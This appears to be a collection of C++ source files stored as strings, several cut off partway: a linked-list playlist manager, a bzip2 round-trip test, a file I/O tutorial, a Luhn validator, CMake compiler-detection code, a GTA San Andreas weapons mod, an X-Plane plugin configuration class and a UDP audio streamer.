    "#include<iostream>\n#include<string.h>\n#include<stdlib.h>\n#include<stdio.h>\n#include<fstream>\n\nusing namespace std;\n\nstruct node\n{\n    char song[100];\n    struct node *next;\n    struct node *prev;\n}*top,*temp,*top1;\n\nvoid tofile(char a[])\n{\n    fstream f1;\n    f1.open(\"playlist.txt\",ios::out|ios::app);\n    f1<<a<<endl;\n    f1.close();\n}\n\nvoid add_node(struct node *first)\n{\n    char a[100];\n    while(first->next != NULL)\n    {\n        first = first->next;\n    }\n    first->next = (struct node*)malloc(sizeof(struct node));\n    first->next->prev = first;\n    first = first->next;\n    cout << \"\\n\\a\\a\\a\\aEnter Song name-  \";\n    scanf(\"%s\", a); \n    strcpy(first->song, a);\n    tofile(a);\n    first->next = NULL;\n}\n\nvoid add_node_file(struct node *first, string a)\n{\n    while(first->next != NULL)\n    {\n        first = first->next;\n    }\n    first->next = (struct node*)malloc(sizeof(struct node));\n    first->next->prev = first;\n    first = first->next;\n    strcpy(first->song, a.c_str());\n    first->next = NULL;\n}\n\nvoid delete_file(char a[])\n{\n    fstream f1, f2;\n    string line;\n    int x = 0;\n    f1.open(\"playlist.txt\", ios::in);\n    f2.open(\"temp.txt\", ios::out);\n    while(getline(f1, line))\n    {\n        if(strcmp(a, line.c_str()) != 0)\n            f2 << line << endl;\n        else\n            x = 1;\n    }\n    f1.close();\n    f2.close();\n    remove(\"playlist.txt\");\n    rename(\"temp.txt\", \"playlist.txt\");\n    if(x == 0)\n    {\n        cout << \"There is no song with the name you entered.\" << endl;\n    }\n    else\n    {\n        cout << \"Song has been deleted.\" << endl;\n    }\n}\n\nvoid del_node(struct node *first)\n{\n    while((first->next)->next != NULL)\n    {\n        first = first->next;\n    }\n    struct node *temp;\n    temp = first->next;\n    first->next = NULL;\n    free(temp);\n    cout << \"Deleted\" << endl;\n}\n\nvoid printlist(struct node *first)\n{\n    cout << \"\\nPlaylist Name- \";\n    while(first->next != NULL)\n    {\n        cout << first->song << endl;\n        first = first->next;\n    }\n    cout << first->song << endl;\n}\n\nvoid count_nodes(struct node *first)\n{\n    int i = 0;\n    while (first->next != NULL)\n    {\n        first = first->next;\n        i++;\n    }\n    i++;\n    cout << \"\\nTotal songs-  \" << i-1 << endl;\n}\n\nstruct node *del_pos(struct node *pointer, int pos)\n{\n    struct node *n1, *prev1, *temp;\n    prev1 = (struct node *)malloc(sizeof(node));\n    temp = (struct node *)malloc(sizeof(node));\n    int i = 0;\n\n    if(pos == 1)\n    {\n        temp = pointer;\n        delete_file(temp->song);\n        pointer = pointer->next;\n        pointer->prev = NULL;\n        free(temp);\n        printf(\"\\nThe list is updated\\nUse the display function to check\\n\");\n        return pointer;\n    }\n    while(i < pos-1)\n    {\n        prev1 = pointer;\n        pointer = pointer->next;\n        i++;\n    }\n\n    if(pointer->next == NULL)\n    {\n        temp = pointer;\n        delete_file(temp->song);\n        prev1->next = NULL;\n        free(temp);\n        printf(\"\\nThe list is updated\\nUse the display function to check\\n\");\n    }\n    else\n    {\n        temp = pointer;\n        delete_file(temp->song);\n        prev1->next = temp->next;\n        temp->next->prev = prev1;\n        free(temp);\n        printf(\"\\nThe list is updated\\nUse the display function to check\\n\");\n    }\n    return pointer;\n}\n\nvoid search1(struct node *first)\n{\n    char song[100];\n    cout << \"\\n\\a\\a\\a\\aEnter song To be Searched- \";\n    scanf(\"%s\", song); \n    int flag = 0;\n\n    while(first != NULL)\n    {\n        if(strcmp(first->song, song) == 0)\n        {\n            cout << \"\\n\\a\\a\\a\\a#Song Found\" << endl;\n            flag++;\n            break;\n        }\n        else\n        {\n            first = first->next;\n        }\n    }\n    if(flag == 0)\n    {\n        cout << \"\\n\\a\\a\\a\\a#Song Not found\" << endl;\n    }\n}\n\nvoid create()\n{\n    top = NULL;\n}\n\nvoid push(char data[])\n{\n    if (top == NULL)\n    {\n        top = (struct node *)malloc(sizeof(struct node));\n        top->next = NULL;\n        strcpy(top->song, data);\n    }\n    else if (strcmp(top->song, data) != 0)\n    {\n        temp = (struct node *)malloc(sizeof(struct node));\n        temp->next = top;\n        strcpy(temp->song, data);\n        top = temp;\n    }\n}\n\nvoid display()\n{\n    top1 = top;\n    if (top1 == NULL)\n    {\n        printf(\"\\n\\a\\a\\a\\a=>NO recently played tracks.\\n\");\n        return;\n    }\n    printf(\"\\n\\a\\a\\a\\a#Recently played tracks-\\n\");\n    while (top1 != NULL)\n    {\n        printf(\"%s\", top1->song);\n        printf(\"\\n\");\n        top1 = top1->next;\n    }\n}\n\nvoid play(struct node *first)\n{\n    char song[100];\n    printlist(first);\n    cout << \"\\n\\a\\a\\a\\aChoose song you wish to play- \";\n    scanf(\"%s\", song); \n    int flag = 0;\n\n    while(first != NULL)\n    {\n        if(strcmp(first->song, song) == 0)\n        {\n            cout << \"\\n\\a\\a\\a\\a=>Now Playing......\" << song << endl;\n            flag++;\n            push(song);\n            break;\n        }\n        else\n        {\n            first = first->next;\n        }\n  ",
    "#include <cstdio>\n\n#include \"node_bzip2_common.hpp\"\n#include \"node_bzip2_compress.hpp\"\n#include \"node_bzip2_decompress.hpp\"\n\nNodeBzip2::Result doCompress()\n{\n\tconst char *dataPtr = new char[13];\n\tsize_t dataLength = 13;\n\tmemcpy((void *)dataPtr, \"Hello, world!\", 13);\n\n\tNodeBzip2::CompressionOptions options;\n\tNodeBzip2::DataSlice data = NodeBzip2::DataSlice::Owned(dataPtr, dataLength);\n\tNodeBzip2::Result result = NodeBzip2::CompressRaw(data, options);\n\n\treturn result;\n}\n\nNodeBzip2::Result doDecompress(NodeBzip2::Result cResult)\n{\n\tstd::vector<char> *out = cResult.getData();\n\tNodeBzip2::DataSlice data = NodeBzip2::DataSlice::Clone(out->data(), out->size());\n\tNodeBzip2::DecompressionOptions options;\n\tNodeBzip2::Result result = NodeBzip2::DecompressRaw(data, options);\n\n\treturn result;\n}\n\nNodeBzip2::Result doCompressDecompress()\n{\n\tNodeBzip2::Result cResult = doCompress();\n\tassert(!cResult.hasError());\n\n\tNodeBzip2::Result dResult = doDecompress(std::move(cResult));\n\treturn dResult;\n}\n\nint doTest()\n{\n\tNodeBzip2::Result result = doCompressDecompress();\n\tassert(!result.hasError());\n\n\tif (strncmp(result.getData()->data(), \"Hello, world!\", 13) == 0)\n\t{\n\t\tprintf(\"Success\\n\");\n\t\treturn 0;\n\t}\n\telse\n\t{\n\t\tprintf(\"Failure\\n\");\n\t\treturn 1;\n\t}\n}\n\nint main()\n{\n\treturn doTest();\n}",
    "#include <iostream>\n#include <fstream>\n#include <string>\nusing namespace std;\n\n\nint main()\n{\n\tstring baris;\n\n\t//membuka file dalam mode menulis.\n\tofstream outfile;\n\t//menunjuk ke sebuah nama file\n\toutfile.open(\"contohfile.txt\");\n\n\tcout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\t//unlimited loop untuk menulis\n\twhile (true)\n\t{\n\t\tcout << \"- \";\n\t\t//mendapatkan setiap karakter dalam satu baris\n\t\tgetline(cin, baris);\n\t\t//loop akan berhenti jika anda memasukkan karakter q\n\t\tif (baris == \"q\") break;\n\t\t//menulis dan memasukkan nilai dari 'baris' ke dalam file\n\t\toutfile << baris << endl;\n\t}\n\t//selesai dalam menulis sekarang tutup file\n\toutfile.close();\n\n\t//membuka file dalam mode membaca\n\tifstream infile;\n\t//menunjuk ke sebuah file\n\tinfile.open(\"contohfile.txt\");\n\n\tcout << endl << \">= Membuka dan membaca file \" << endl;\n\t//jika file ada maka\n\tif (infile.is_open())\n\t{\n\t\twhile (getline(infile, baris))\n\t\t{\n\t\t\tcout << baris << '\\n';\n\t\t}\n\t\tinfile.close();\n\t}\n\t//jika tidak ditemukan file maka akan menampilkan ini\n\telse cout << \"Unable to open file\";\n\treturn 0;\n\n}\n",
    "#include \"luhn.h\"\r\n#include <iostream>\r\n#include <string>\r\n#include <algorithm>\r\n#include <vector>\r\n#include <numeric>\r\nusing namespace std;\r\nnamespace luhn {\r\n    bool valid(string ID){\r\n        // Preprocessing for valid inputs\r\n        // Remove spaces\r\n        ID.erase(remove(ID.begin(), ID.end(), ' '), ID.end());\r\n        // Check if size >= 2\r\n        if(ID.size() <= 1){\r\n            return false;\r\n        }\r\n        \r\n        unsigned int index_to_double = (((ID.size() % 2) == 0) ? 0 : 1);\r\n        int sum = 0;\r\n        for (unsigned int i = 0; i < ID.size(); i++) {\r\n            // Check for invalid characters\r\n            if (!(ID[i] >= 48 && ID[i] <= 57)) {\r\n                return false;\r\n            }\r\n            // Luhn algorithm\r\n            int value_of_char_at_i = (ID[i]-'0');\r\n            if (i == index_to_double) {\r\n                index_to_double = index_to_double + 2;\r\n                 value_of_char_at_i = value_of_char_at_i * 2;\r\n                int computed_value = (value_of_char_at_i > 9) ? value_of_char_at_i - 9 : value_of_char_at_i;\r\n                sum = sum + computed_value;\r\n            } else {\r\n                sum = sum + value_of_char_at_i;\r\n            }\r\n        }\r\n        return (sum % 10 == 0);\r\n    }\r\n}  // namespace luhn\r\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"COrdnanceSystem.hpp\"\n#include \"plugin.h\"\n#include \"CWorld.h\"\n#include \"CWeaponEffects.h\"\n#include \"CProjectileInfo.h\"\n#include \"NodeName.h\"\n#include \"CAudioEngine.h\"\n\nusing namespace plugin;\nusing namespace std;\n\nstatic CVehicle* gs_pVehicle;\nstatic constexpr short GUN_RATE = 30;\nstatic unsigned int gs_nGunFiringTime;\nstatic constexpr short ROCKET_RATE = 250;\nstatic unsigned int gs_nRocketFiringTime;\nstatic unsigned int gs_nTargetLockStartTime;\nstatic CEntity* gs_pTargetEntity;\nstatic constexpr short MISSILE_RATE = 500;\nstatic unsigned int gs_nMissileFiringTime;\nstatic constexpr short FLARE_RATE = 1000;\nstatic unsigned int gs_nFlareFiringTime;\n\nvoid COrdnanceSystem::InstallPatches()\n{\n    injector::MakeRangedNOP(0x6D3F30, 0x6D3F39);    injector::MakeJMP(0x6D3F30, MyGetPlaneNumGuns);\n    //remove the mark restriction that is only used by hydra\n    injector::MakeRangedNOP(0x527058, 0x52705F);    injector::MakeJMP(0x527058, 0x52706A);\n}\n\nvoid COrdnanceSystem::reInit()\n{\n    gs_nGunFiringTime = gs_nRocketFiringTime = gs_nTargetLockStartTime = gs_nMissileFiringTime = gs_nFlareFiringTime = NULL;\n    gs_pTargetEntity = nullptr;\n}\n\nvoid COrdnanceSystem::MyProcessWeapons(injector::reg_pack& regs)\n{\n    regs.ecx = regs.esi;\n\n    gs_pVehicle = reinterpret_cast<CVehicle*>(regs.esi);\n    LoadOrdnanceInfo();\n    ProcessOrdnance();\n\n    if (!ms_OrdnanceInfo.Get(gs_pVehicle).flags.disableTheOriginal)\n        gs_pVehicle->ProcessWeapons();\n}\n\nstatic RwFrame* FindNodeCB(RwFrame* frame, void* oi)\n{\n    constexpr char  frame_prefix[] = \"OEx_\", gun[] = \"OEx_gun\", rocket[] = \"OEx_rocket\", missile[] = \"OEx_missile\", flare[] = \"OEx_flare\";\n\n    string_view name(GetFrameNodeName(frame));\n    if (name.find(frame_prefix) == string_view::npos)   return RwFrameForAllChildren(frame, FindNodeCB, nullptr);\n\n    COrdnanceInfo& info = *static_cast<COrdnanceInfo*>(oi);\n    switch (name[4]) {\n    case 'g':   info.guns.push_back(frame);     break;\n    case 'r':   info.rockets.push_back(frame);  if (!info.flags.rockets_cyclic)  info.flags.rockets_cyclic = frame->child;  break;\n    case 'm':   info.missiles.push_back(frame); if (!info.flags.missiles_cyclic) info.flags.missiles_cyclic = frame->child; break;\n    case 'f':   info.flares.push_back(frame);   break;\n    case 'd':   info.flags.disableTheOriginal = true;    break;\n    default:    break;\n    }\n\n    return frame;\n}\n\nvoid COrdnanceSystem::LoadOrdnanceInfo()\n{\n    auto& oi = ms_OrdnanceInfo.Get(gs_pVehicle);\n    if (oi.flags.processed) return;\n\n    RwFrameForAllChildren((RwFrame*)gs_pVehicle->m_pRwObject->parent, FindNodeCB, &oi);\n\n    oi.flags.processed = true;\n    oi.flags.needProcess = oi.guns.size() || oi.rockets.size() || oi.missiles.size() || oi.flares.size();\n}\n\nint32_t __fastcall COrdnanceSystem::MyGetPlaneNumGuns(CVehicle* vehicle, int)\n{\n    //the second parameter is edx, and we need to protect it\n    __asm push edx\n\n    int32_t nums = ms_OrdnanceInfo.Get(vehicle).guns.size();\n    if (!nums) {\n        switch (vehicle->m_nModelIndex) {\n        case MODEL_HUNTER:\n        case MODEL_SEASPAR:\n        case MODEL_RCBARON:\n        case MODEL_MAVERICK:\n        case MODEL_POLMAV:\n        case MODEL_CARGOBOB:\n            nums = 1;   break;\n        case MODEL_RUSTLER:\n            nums = 6;   break;\n        case MODEL_HYDRA:\n        case MODEL_TORNADO:\n            nums = 2;   break;\n        default:\n            nums = 0;   break;\n        }\n    }\n\n    __asm pop edx\n    return nums;\n}\n\nvoid COrdnanceSystem::FirePlaneGuns()\n{\n    if (!gs_pVehicle->GetPlaneNumGuns())    return;\n    if (CTimer::m_snTimeInMilliseconds <= gs_nGunFiringTime + GUN_RATE)  return;\n\n\n    const auto& oi = ms_OrdnanceInfo.Get(gs_pVehicle);\n    CWeapon weapon(WEAPON_MINIGUN, 5000);\n    const CVector velocityOffset = gs_pVehicle->m_vecMoveSpeed * CTimer::ms_fTimeStep;\n\n    for (size_t i = 0; i < oi.guns.size(); ++i) {\n        CVector gunShellPos = velocityOffset + *RwMatrixGetPos(RwFrameGetLTM(oi.guns[i]));\n        CVector planeGunPosMS(*RwMatrixGetPos(RwFrameGetMatrix(oi.guns[i])));//Model Space\n        gs_pVehicle->DoPlaneGunFireFX(&weapon, planeGunPosMS, gunShellPos, i);\n        weapon.FireInstantHit(gs_pVehicle, &gunShellPos, &gunShellPos, nullptr, nullptr, nullptr, false, false);\n    }\n\n    int32_t player_slot = CallAndReturn<int32_t, 0x564000, CEntity*>(gs_pVehicle);\n    CPad* pad = CPad::GetPad(player_slot);\n    pad->StartShake(240, 123u, 0);//magic number\n\n    CallMethod <0x506F40, CAudioEngine*, eAudioEvents, eWeaponType, CEntity*>(&AudioEngine, eAudioEvents::AE_WEAPON_FIRE_PLANE, WEAPON_M4, gs_pVehicle);\n    gs_nGunFiringTime = CTimer::m_snTimeInMilliseconds;\n}\n\nvoid COrdnanceSystem::FireUnguidedMissile()\n{\n    if (CTimer::m_snTimeInMilliseconds <= gs_nRocketFiringTime + ROCKET_RATE) return;\n\n    const auto& oi = ms_OrdnanceInfo.Get(gs_pVehicle);\n    CWeapon weapon(WEAPON_RLAUNCHER, 5000);\n\n    auto dot = [](const CVector& left, const CVector& right)->float {return left.z * right.z + left.y * right.y + le",
    "/*\n * This file is part of the Ivy distribution (https://github.com/KarinasHome/Ivy).\n * Copyright (c) 2019 Karina A.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, version 3.\n *\n * This program is distributed in the hope that it will be useful, but\n * WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"MyIvyConfiguration.h\"\n\n#include <boost/property_tree/ptree.hpp>\n#include <boost/property_tree/ini_parser.hpp>\n\n\nMyIvyConfiguration::MyIvyConfiguration()\n{\n\tchar buffer[2048];\n\tXPLMGetSystemPath(buffer);\n\tm_system_path = buffer;\n\t\n\tivy_output_file << \"Ivy System Path\" << m_system_path  <<  std::endl;\n\tivy_output_file.flush();\n\n\tm_dir_sep = XPLMGetDirectorySeparator();\n\n\tivy_output_file << \"Ivy directory separator\" << m_dir_sep << std::endl;\n\tivy_output_file.flush();\n\t//m_dir_sep = buffer;\n\n\tm_mp3_dir = \"IvyFunny1\";\n\tSetAudioDirectory();\n\tm_ini_path = m_system_path + m_dir_sep + \"Resources\" + m_dir_sep + \"plugins\" + m_dir_sep + \"Ivy\" + m_dir_sep + \"Ivy.ini\";\n\tm_config_path = m_system_path + m_dir_sep + \"Resources\" + m_dir_sep + \"plugins\" + m_dir_sep + \"Ivy\" + m_dir_sep + \"IvyConfig\" + m_dir_sep;\n\tm_logbook_path = m_system_path + m_dir_sep + \"Resources\" + m_dir_sep + \"plugins\" + m_dir_sep + \"Ivy\" + m_dir_sep + \"IvyConfig\" + m_dir_sep + \"IvyLogbook.txt\";\n\tm_errorlog_path = m_system_path + m_dir_sep + \"Resources\" + m_dir_sep + \"plugins\" + m_dir_sep + \"Ivy\" + m_dir_sep + \"IvyConfig\" + m_dir_sep + \"IvyErrorLog.xml\";\n\tm_output_path = m_config_path + \"IvyLog.txt\";\n\n\tm_audio_names.push_back(\"Ivy (US) - Funny\");\n\tm_audio_dirs.push_back(\"IvyFunny1\");\n\n\tm_audio_names.push_back(\"Ivy (US) - Funny, Normal Announcements\");\n\tm_audio_dirs.push_back(\"IvyFunny2\");\n\n\tm_audio_names.push_back(\"Brian (UK) - Funny\");\n\tm_audio_dirs.push_back(\"BrianFunny\");\n\n\tm_audio_names.push_back(\"Ivy (US)\");\n\tm_audio_dirs.push_back(\"IvySerious\");\n\n\tm_audio_names.push_back(\"Matthew (US)\");\n\tm_audio_dirs.push_back(\"MatthewSerious\");\n\n\tm_audio_names.push_back(\"Salli (US)\");\n\tm_audio_dirs.push_back(\"SalliSerious\");\n\n\tm_audio_names.push_back(\"Joey (US)\");\n\tm_audio_dirs.push_back(\"JoeySerious\");\n\n\tm_audio_names.push_back(\"Emma (UK)\");\n\tm_audio_dirs.push_back(\"EmmaSerious\");\n\n\tm_audio_names.push_back(\"Brian (UK)\");\n\tm_audio_dirs.push_back(\"BrianSerious\");\n\n\tm_audio_names.push_back(\"Nicole (AUS)\");\n\tm_audio_dirs.push_back(\"NicoleSerious\");\n\n\tm_audio_names.push_back(\"Russel (AUS)\");\n\tm_audio_dirs.push_back(\"RusselSerious\");\n\n}\n\n\nMyIvyConfiguration::~MyIvyConfiguration()\n{\n}\n\nvoid MyIvyConfiguration::WriteConfig()\n{\n\tboost::property_tree::ptree pt;\n\n\tpt.put(\"IVY_SETTINGS.mp3_dir\", m_mp3_dir);\n\tpt.put(\"IVY_SETTINGS.ivy_volume\", m_ivyVolume);\n\n\tpt.put(\"IVY_SETTINGS.ivy_enable\", m_ivy_enable);\n\tpt.put(\"IVY_SETTINGS.log_enable\", m_log_enable);\n\tpt.put(\"IVY_SETTINGS.callouts_enable\", m_callouts_enable);\n\tpt.put(\"IVY_SETTINGS.errors_enable\", m_errors_enable);\n\tpt.put(\"IVY_SETTINGS.baro_is_error\", m_baro_is_error);\n\tpt.put(\"IVY_SETTINGS.pre_warnings\", m_pre_warnings);\n\n\tpt.put(\"IVY_SETTINGS.passengers_screaming\", m_passengers_screaming);\n\tpt.put(\"IVY_SETTINGS.passengers_applause\", m_passengers_applause);\n\n\n\tpt.put(\"IVY_SETTINGS.passengers_enabled\", m_passengers_enabled);\n\tpt.put(\"IVY_SETTINGS.ouch_enabled\", m_ouch_enabled);\n\n\tpt.put(\"IVY_SETTINGS.pos_rate_climb\", m_pos_rate_climb);\n\tpt.put(\"IVY_SETTINGS.ivy_ouch_g\", m_ivy_ouch_g);\n\tpt.put(\"IVY_SETTINGS.brake_max_forward_g\", m_brake_max_forward_g);\n\tpt.put(\"IVY_SETTINGS.alt_landing_lights_low\", m_alt_landing_lights_low);\n\tpt.put(\"IVY_SETTINGS.alt_landing_lights_high\", m_alt_landing_lights_high);\n\tpt.put(\"IVY_SETTINGS.night_world_light_precent\", m_night_world_light_precent);\n\tpt.put(\"IVY_SETTINGS.taxi_ground_speed_min\", m_taxi_ground_speed_min);\n\tpt.put(\"IVY_SETTINGS.vis_is_fog\", m_vis_is_fog);\n\tpt.put(\"IVY_SETTINGS.cab_rate_low\", m_cab_rate_low);\n\tpt.put(\"IVY_SETTINGS.cab_rate_high\", m_cab_rate_high);\n\tpt.put(\"IVY_SETTINGS.cab_rate_reset_hysteresis\", m_cab_rate_reset_hysteresis);\n\tpt.put(\"IVY_SETTINGS.bank_reset_low\", m_bank_reset_low);\n\tpt.put(\"IVY_SETTINGS.bank_low\", m_bank_low);\n\tpt.put(\"IVY_SETTINGS.bank_high\", m_bank_high);\n\tpt.put(\"IVY_SETTINGS.bank_xhigh\", m_bank_xhigh);\n\tpt.put(\"IVY_SETTINGS.pitch_reset_low\", m_pitch_reset_low);\n\tpt.put(\"IVY_SETTINGS.pitch_low\", m_pitch_low);\n\tpt.put(\"IVY_SETTINGS.pitch_high\", m_pitch_high);\n\tpt.put(\"IVY_SETTINGS.max_g_down_low_reset\", m_max_g_down_low_reset);\n\tpt.put(\"IVY_SETTINGS.max_g_down_low\", m_max_g_down_low);\n\tpt.put(\"IVY_SETTINGS.max_g_down_high\", m_max_g_down_high);\n\tpt.put(\"IVY_SETTINGS.max_g_down_xhigh\", m_max_g_down_xhigh);\n\tpt.put(\"IVY_SETTINGS.trans_alt\", m",
    "#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <strings.h>\n#include <string.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <string>\n#include <fcntl.h>\n\n#define PACKET_DATA_SIZE 1152\n#define PACKET_HEADER_SIZE 5\n#define PACKET_SIZE (PACKET_DATA_SIZE + PACKET_HEADER_SIZE)\n\nint main(int argc, char *argv[])  {\n\n    int opt; \n    int iport, isamplerate;\n    uint8_t ibitdepth, ichannels, samplerate_multiplier, samplerate_mask;\n    bool samplerate_441_base;\n    std::string ip = \"\";\n    std::string port = \"\";\n    std::string sample_rate = \"48000\";\n    std::string bit_depth = \"32\";\n    std::string channels = \"2\";\n    uint8_t channel_map[] = {0x00, 0x00};\n    uint8_t header[5] = {0};\n    sockaddr_in destination;\n    int socket_fd = socket(AF_INET, SOCK_DGRAM, 0);\n    char buffer_pending[(PACKET_DATA_SIZE * 2) + PACKET_HEADER_SIZE] = {0};\n    char *buffer_pending_data = buffer_pending + PACKET_HEADER_SIZE;\n    int buffer_pending_bytes = 0;\n    int retval = 0;\n\n    if(socket_fd<0){\n        printf(\"cannot open socket\\n\");\n        return false;\n    }\n\n    // Parse arguments\n    while((opt = getopt(argc, argv, \"i:p:s:b:c:m:h\")) != -1)  \n    {  \n        switch(opt)  \n        {  \n            case 'i':\n                ip = optarg;\n                break;\n            case 'p':\n                port = optarg;\n                break;\n            case 's':\n                sample_rate = optarg;\n                break;\n            case 'b':\n                bit_depth = optarg;\n                break;\n            case 'c':\n                printf(\"NOT IMPLEMENTED %c\\n\", optopt);\n                break;\n            case 'm':\n                printf(\"NOT IMPLEMENTED %c\\n\", optopt);\n                break;\n            case 'h':\n                printf(\"ScreamSender Help\\n\");\n                printf(\"Usage: %s -i <IP> -p <port> -s <sample rate=48000> -b <bit depth=32>\\n\", argv[0]);\n                return 3;\n            case ':':\n                printf(\"Option %c needs value\\n\", optopt);\n                break;\n            case '?':\n                printf(\"Unknown option %c\\n\", optopt);\n        }  \n    }\n\n    for(; optind < argc; optind++){      \n        printf(\"extra arguments: %s\\n\", argv[optind]);  \n    } \n\n    // Configure Socket Destination\n    iport = atoi(port.c_str());\n    bzero(&destination,sizeof(destination));\n    destination.sin_family = AF_INET;\n    destination.sin_addr.s_addr = inet_addr(ip.c_str());\n    destination.sin_port = htons(iport);\n    printf(\"Sending to %s:%i\\n\", ip.c_str(), iport);\n\n    // Build Scream Header\n    isamplerate = atoi(sample_rate.c_str());\n    ibitdepth = atoi(bit_depth.c_str());\n    ichannels = 